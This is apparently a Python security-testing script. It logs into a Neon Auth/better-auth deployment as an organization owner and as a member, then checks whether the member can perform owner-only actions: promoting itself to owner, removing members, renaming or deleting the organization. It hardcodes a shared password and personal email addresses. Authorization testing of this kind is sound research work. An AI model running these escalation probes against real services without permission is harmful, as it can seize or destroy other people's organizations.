# -*- coding: utf-8 -*-
"""org member 越权矩阵:na2(owner) vs secn12(member) 同端点行为差
better-auth organization 插件标准端点 x 角色"""
import http.client, ssl, json, time

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
ORIGIN = 'http://localhost:3000'
ORG_ID = '5cab4435-9577-44cb-8cf0-50fa9a84ebd7'
NA2_UID = '8e3f631f-3ec6-4d71-b580-195b52a30ab3'  # owner
N12_UID = 'f0dc6253-0ad2-4471-b5ec-ee09a9ad758a'  # member (secn12)
PW = 'SecTest!2026pass2'

def login(email):
    conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
         'Content-Type': 'application/json', 'Origin': ORIGIN}
    conn.request('POST', '/neondb/auth/sign-in/email',
                 json.dumps({'email': email, 'password': PW}).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    st = r.status
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    conn.close()
    ck = ''
    for part in hdrs.get('set-cookie', '').split(','):
        kv = part.strip().split(';')[0]
        if '=' in kv:
            k, v = kv.split('=', 1)
            ck = ck + ('; ' if ck else '') + '%s=%s' % (k.strip(), v.strip())
    return st, ck

def req(cookie, method, path, body=None):
    try:
        conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
             'Content-Type': 'application/json', 'Origin': ORIGIN, 'Cookie': cookie}
        conn.request(method, '/neondb/auth' + path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        conn.close()
        return st, raw.decode('utf-8', 'replace')
    except Exception as e:
        return -1, 'EXC %s' % e

st, ck2 = login('libobo1229+na2@gmail.com')   # owner
st, ck12 = login('libobo1229+secn12@gmail.com')  # member
print('owner ck:', bool(ck2), 'member ck:', bool(ck12), flush=True)

# 端点字典:owner 预期可用 vs member 预期拒绝
tests = [
    # (名称, method, path, body)
    ('invite-member', 'POST', '/organization/invite-member',
     {'email': 'libobo1229+secn14@gmail.com', 'role': 'member', 'organizationId': ORG_ID}),
    ('reject-invitation', 'POST', '/organization/reject-invitation',
     {'invitationId': '45abf8f5-86f7-4f66-a700-b45f2236e649'}),
    ('update-member-role', 'POST', '/organization/update-member-role',
     {'memberId': N12_UID, 'role': 'owner', 'organizationId': ORG_ID}),
    ('update-member-role2', 'POST', '/organization/update-member-role',
     {'memberId': N12_UID, 'role': 'admin', 'organizationId': ORG_ID}),
    ('remove-member', 'POST', '/organization/remove-member',
     {'memberIdOrUserId': N12_UID, 'organizationId': ORG_ID}),
    ('update-org', 'POST', '/organization/update',
     {'organizationId': ORG_ID, 'data': {'name': 'sec-n12-org-x'}}),
    ('delete-org', 'POST', '/organization/delete', {'organizationId': ORG_ID}),
    ('leave-org', 'POST', '/organization/leave', {'organizationId': ORG_ID}),
    ('set-active', 'POST', '/organization/set-active', {'organizationId': ORG_ID}),
    ('get-org-full', 'GET', '/organization/full', None),
    ('members-list', 'GET', '/organization/members', None),
    ('member-list', 'GET', '/organization/member/list', None),
    ('get-members', 'POST', '/organization/get-members', {'organizationId': ORG_ID}),
    ('active-org', 'GET', '/organization/get-active', None),
    ('invites-list', 'GET', '/organization/invites/list', None),
]
print('\n=== 端点 x 角色矩阵(owner | member) ===', flush=True)
for name, m, p, b in tests:
    # member 先(member 的越权尝试是重点)
    st_a, raw_a = req(ck12, m, p, b)
    st_b, raw_b = req(ck2, m, p, b)
    tag = ''
    if st_a != 404 and st_b == 404:
        tag = ' <<< member-only?!'
    if st_a == 200 and st_b != 200:
        tag = ' <<< MEMBER_BYPASS!'
    print('[%s] member->%d %s | owner->%d %s%s' % (
        name, st_a, raw_a[:110].replace('\n', ' '),
        st_b, raw_b[:110].replace('\n', ' '), tag), flush=True)
    time.sleep(0.25)
